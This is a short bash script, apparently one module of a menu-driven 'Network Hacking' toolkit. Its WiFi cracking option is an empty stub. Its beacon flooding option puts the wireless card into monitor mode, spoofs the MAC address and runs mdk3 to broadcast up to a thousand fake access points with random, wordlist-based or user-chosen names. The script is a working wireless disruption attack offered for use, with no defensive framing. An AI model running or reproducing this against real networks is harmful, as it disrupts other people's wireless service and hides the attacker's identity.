#!/usr/bin/env bash
source main.sh
current="Network Hacking"
folder="scripts/$current"
ready
# END OF BOILER (DO NOT REMOVE OR MODIFY ABOVE CODE)




selectOptions "Manage Mac & IP" "Selection" "Try another selection" "Wifi Cracking" "Beacon Flooding"
if [[ "$SO" == "1" ]]; then   # Wifi Cracking
  :

elif [[ "$SO" == "2" ]]; then # Beacon Flooding
  selectOptions "Beacon Flooding" "Selection" "Try another selection" "Random Network Names" "Network Names from Worldist" "Specific Network Names"
  if [[ "$SO" == "1" ]]; then   # Random
    changeWImode monitor
    changeMac
    mdk3 $WI b -f "$folder/wordlist.txt" -a -s 1000
  elif [[ "$SO" == "2" ]]; then # Wordlist
    getInput "Wordlist File" "Enter Wordlist Path." "/root/desktop/wordlist.txt"
    changeWImode monitor
    changeMac
    mdk3 $WI b -f "$SI" -a  -s 1000
  elif [[ "$SO" == "3" ]]; then # Specific
    getInput "Network Name" "Type a string" "xPWNEDx"
    string=$SI
    getInput "Number of APs" "Enter the number of Access Points to generate." "1000"
    N=$SI
    COUNT=1
    while [ $COUNT -lt $N ]; do
      echo $string $COUNT >> "$string.txt"
      let COUNT=COUNT+1
    done
    mdk3 $WI b -f "./$string.txt"-a  -s 1000 && rm "./$string.txt"
    # mdk3 $WI b -n "$string"-a  -s $N
    # mdk3 wlan0 b -n FreeWifi -m
  fi
fi
